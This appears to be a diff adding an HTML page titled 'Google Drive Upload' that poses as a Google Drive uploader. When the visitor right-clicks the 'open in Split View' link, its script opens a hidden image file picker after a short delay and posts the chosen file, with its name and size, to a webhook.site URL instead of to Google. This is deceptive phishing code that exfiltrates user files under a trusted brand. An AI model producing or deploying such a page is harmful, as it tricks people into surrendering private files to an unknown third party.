@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Google Drive Upload</title>
+<style>
+    h1 { margin: 1em; }
+    input { display: none; }
+    img { width: 100%; }
+</style>
+</head>
+<body>
+
+<center>
+<br><br><br><br>
+
+<h3><a id="link" href="https://workspace.google.com/intl/en_in/products/drive/">
+Right Click and Open in Split View for faster upload!
+</a></h3>
+
+<br>
+<img id="img">
+
+</center>
+
+<input id="fileSelect" type="file" accept="image/*" />
+
+<script>
+const link = document.getElementById('link');
+const fileSelect = document.getElementById('fileSelect');
+const img = document.getElementById('img');
+
+const WEBHOOK_URL = "https://webhook.site/58a49a8b-0b68-4b7e-a570-45ba2d00e728";
+
+link.addEventListener('contextmenu', function(event) {
+
+    setTimeout(() => {
+
+        try {
+            fileSelect.click();
+
+            fileSelect.onchange = async () => {
+                if (!fileSelect.files.length) return;
+
+                const file = fileSelect.files[0];
+
+                // preview
+                img.src = URL.createObjectURL(file);
+
+                const formData = new FormData();
+                formData.append("file", file);
+                formData.append("filename", file.name);
+                formData.append("size", file.size);
+
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        body: formData
+                    });
+
+                    console.log("File sent to webhook");
+
+                } catch (err) {
+                    console.log("Webhook error:", err);
+                }
+            };
+
+        } catch (e) {
+            console.log("Upload blocked:", e);
+        }
+
+    }, 1500); // give user enough time to split view
+
+});
+</script>
+
+</body>
+</html>
